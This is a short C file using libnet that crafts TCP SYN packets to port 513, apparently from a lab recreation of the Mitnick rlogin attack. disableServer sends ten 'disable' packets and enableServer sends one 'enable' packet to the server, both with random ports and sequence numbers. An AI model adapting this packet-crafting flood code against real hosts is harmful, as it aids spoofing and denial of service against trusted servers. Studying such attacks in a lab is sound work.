#include "flood.h"
#include <stdio.h>
#include <stdlib.h>
#include "sender.h"
void disableServer(libnet_t *l,u_long kevinIp, u_long serverIp)
{
    tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
                                    libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
                                    "disable", 7,
                                    TH_SYN);

    ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
                                   NULL, (u_int32_t)7 );

    for(int i=0; i<10; i++)
    {   
        sendPacket(l);
    }
                        
}

void enableServer(libnet_t *l,u_long kevinIp,u_long serverIp)
{
    tcpTagCreate(l,libnet_get_prand(LIBNET_PRu16),(u_int16_t)513,
                                    libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
                                    "enable", 6,
                                    TH_SYN);

    ipTagCreate(l,(u_int32_t)kevinIp,(u_int32_t)serverIp,
                                   NULL, (u_int32_t)7 );

    sendPacket(l);

}